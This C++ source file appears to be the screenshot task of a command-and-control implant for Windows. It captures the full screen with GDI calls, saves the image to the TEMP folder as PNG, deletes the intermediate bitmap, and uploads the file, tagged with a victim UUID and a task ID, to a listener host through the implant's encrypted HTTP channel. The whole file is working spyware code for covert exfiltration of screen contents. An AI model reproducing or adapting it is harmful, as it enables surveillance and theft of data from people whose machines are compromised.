#include "core/task.hpp"

HINSTANCE hInst;
std::wstring wWindowClassName = L"MainWindowClass";
// std::wstring wFilenameBmp = L"tmp.bmp";
std::wstring wFilenameBmp ;
// std::wstring wFilenamePng = L"tmp.png";
std::wstring wFilenamePng;

namespace Task::Helper::Screenshot
{
    BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow)
    {
        hInst = hInstance;

        HWND hWnd = CreateWindowExW(
            WS_EX_TRANSPARENT, // WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_LAYERED,
            wWindowClassName.c_str(),
            L"Sample",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            GetSystemMetrics(SM_CXFULLSCREEN), // GetSystemMetrics(SM_CXSCREEN),
            GetSystemMetrics(SM_CYFULLSCREEN), // GetSystemMetrics(SM_CYSCREEN),
            (HWND)NULL,
            (HMENU)NULL,
            hInstance,
            (LPVOID)NULL
        );

        if (!hWnd)
        {
            return FALSE;
        }

        ShowWindow(hWnd, nCmdShow);
        UpdateWindow(hWnd);
        return TRUE;
    }

    INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
    {
        UINT  num = 0;          // number of image encoders
        UINT  size = 0;         // size of the image encoder array in bytes

        Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
        Gdiplus::GetImageEncodersSize(&num, &size);
        if(size == 0)
        {
            return -1;  // Failure
        }

        pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
        if(pImageCodecInfo == NULL)
        {
            return -1;  // Failure
        }

        Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
        for(UINT j = 0; j < num; ++j)
        {
            if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
            {
                *pClsid = pImageCodecInfo[j].Clsid;
                free(pImageCodecInfo);
                return j;  // Success
            }    
        }

        free(pImageCodecInfo);
        return -1;
    }

    BOOL BmpToPng()
    {
        // Initialize GDI+.
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        CLSID   encoderClsid;
        Gdiplus::Status  stat;
        Gdiplus::Image*  image = new Gdiplus::Image(wFilenameBmp.c_str());

        // Get the CLSID of the PNG encoder.
        GetEncoderClsid(L"image/png", &encoderClsid);

        stat = image->Save(wFilenamePng.c_str(), &encoderClsid, NULL);

        // if(stat == Gdiplus::Ok)
        // {
        //     DisplayMessageBoxA("png file saved successfully.", "BmpToPng");
        // }
        // else
        // {
        //     DisplayMessageBoxA("failed", "BmpToPng");
        // }

        delete image;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return TRUE;
    }

    BOOL DeleteBmp()
    {
        DeleteFile(wFilenameBmp.c_str());
        return TRUE;
    }

    int CaptureAnImage(HWND hWnd)
    {
        HDC hdcScreen;
        HDC hdcWindow;
        HDC hdcMemDC = NULL;
        HBITMAP hbmScreen = NULL;
        BITMAP bmpScreen;
        DWORD dwBytesWritten = 0;
        DWORD dwSizeofDIB = 0;
        HANDLE hFile = NULL;
        char* lpbitmap = NULL;
        HANDLE hDIB = NULL;
        DWORD dwBmpSize = 0;

        hdcScreen = GetDC(NULL);
        hdcWindow = GetDC(hWnd);

        // Create a compatible DC, which is used in a BitBlt from the window DC.
        hdcMemDC = CreateCompatibleDC(hdcWindow);

        if (!hdcMemDC)
        {
            goto done;
        }

        // Get the client area for size calculation.
        RECT rcClient;
        GetClientRect(hWnd, &rcClient);

        // This is the best stretch mode.
        SetStretchBltMode(hdcWindow, HALFTONE);

        // The source DC is the entire screen, and the destination DC is the current window (HWND).
        if (!StretchBlt(
                hdcWindow,
                0,
                0,
                rcClient.right,
                rcClient.bottom,
                hdcScreen,
                0,
                0,
                GetSystemMetrics(SM_CXFULLSCREEN), // GetSystemMetrics(SM_CXSCREEN),
                GetSystemMetrics(SM_CYFULLSCREEN), // GetSystemMetrics(SM_CYSCREEN)
                SRCCOPY
            )
        ) {
            MessageBox(hWnd, L"StretchBlt has failed", L"Failed", MB_OK);
            goto done;
        }

        // Create a compatible bitmap from the Window DC.
        hbmScreen = CreateCompatibleBitmap(
            hdcWindow,
            rcClient.right - rcClient.left,
            rcClient.bottom - rcClient.top
        );

        if (!hbmScreen)
        {
            MessageBox(hWnd, L"CreateCompatibleBitmap Failed", L"Failed", MB_OK);
            goto done;
        }

        // Select the compatible bitmap into the compatible memory DC.
        SelectObject(hdcMemDC, hbmScreen);

        // Bit block transfer into our compatible memory DC.
        if (!BitBlt(
            hdcMemDC,
            0,
            0,
            rcClient.right - rcClient.left,
            rcClient.bottom - rcClient.top,
            hdcWindow,
            0,
            0,
            SRCCOPY
        )) {
            MessageBox(hWnd, L"BitBlt has failed", L"Failed", MB_OK);
            goto done;
        }

        // Get the BITMAP from the HBITMAP.
        GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmpScreen.bmWidth;
        bi.biHeight = bmpScreen.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

        // Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
        // call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
        // have greater overhead than HeapAlloc.
        hDIB = GlobalAlloc(GHND, dwBmpSize);
        lpbitmap = (char*)GlobalLock(hDIB);

        // Gets the "bits" from the bitmap, and copies them into a buffer 
        // that's pointed to by lpbitmap.
        GetDIBits(
            hdcWindow,
            hbmScreen,
            0,
            (UINT)bmpScreen.bmHeight,
            lpbitmap,
            (BITMAPINFO*)&bi,
            DIB_RGB_COLORS
        );

        // A file is created, this is where we will save the screen capture.
        hFile = CreateFile(
            wFilenameBmp.c_str(),
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        // Add the size of the headers to the size of the bitmap to get the total file size.
        dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        // Offset to where the actual bitmap bits start.
        bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
        // Size of the file.
        bmfHeader.bfSize = dwSizeofDIB;
        // bfType must always be BM for Bitmaps.
        bmfHeader.bfType = 0x4D42; // BM.

        WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
        WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
        WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

        // Unlock and Free the DIB from the heap.
        GlobalUnlock(hDIB);
        GlobalFree(hDIB);

        // Close the handle for the file that was created.
        CloseHandle(hFile);

        // Clean up.
    done:
        DeleteObject(hbmScreen);
        DeleteObject(hdcMemDC);
        ReleaseDC(NULL, hdcScreen);
        ReleaseDC(hWnd, hdcWindow);

        BmpToPng();
        DeleteBmp();

        return 0;
    }

    LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
    {   
        switch (message)
        {
        // case WM_COMMAND:
        // {
        //     int wmId = LOWORD(wParam);
        //     switch (wmId)
        //     {
        // // //     case IDM_ABOUT:
        // // //         DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
        // // //         break;
        // // //     case IDM_EXIT:
        // // //         DestroyWindow(hWnd);
        // // //         break;
        //     default:
        //         return DefWindowProc(hWnd, message, wParam, lParam);
        //     }
        // }
        // break;
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            CaptureAnImage(hWnd);
            EndPaint(hWnd, &ps);

            DestroyWindow(hWnd);
        }
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
        return 0;
    }

    ATOM MyRegisterClass(HINSTANCE hInstance)
    {
        WNDCLASSEXW wcex;
        wcex.cbSize = sizeof(WNDCLASSEX);
        wcex.style = CS_HREDRAW | CS_VREDRAW;
        wcex.lpfnWndProc = WndProc;
        wcex.cbClsExtra = 0;
        wcex.cbWndExtra = 0;
        wcex.hInstance = hInstance;
        wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_GDICAPTURINGANIMAGE));
        wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
        wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_GDICAPTURINGANIMAGE);
        wcex.lpszClassName = wWindowClassName.c_str();
        wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

        return RegisterClassExW(&wcex);
    }
}

namespace Task
{
    std::wstring Screenshot(State::PSTATE pState)
    {
        wFilenameBmp = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.bmp";
        wFilenamePng = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.png";

        Task::Helper::Screenshot::MyRegisterClass(pState->hInstance);

        // Perform application initialization:
        if (!Task::Helper::Screenshot::InitInstance(pState->hInstance, pState->nCmdShow))
        {
            return L"Error: Could not initialize.";
        }

        HACCEL hAccelTable = LoadAccelerators(pState->hInstance, MAKEINTRESOURCE(IDC_GDICAPTURINGANIMAGE));

        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0))
        {
            if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
            {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }

        // Upload the screenshot file.
        std::wstring wHeaders = L"";
        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
        wHeaders += L"X-FILE: screenshot\r\n";

        BOOL bResult = System::Http::UploadFile(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeaders.c_str(),
            wFilenamePng
        );
        if (!bResult)
        {
            return L"Error: Failed to upload capture image.";
        }

        return wFilenamePng;
    }
}
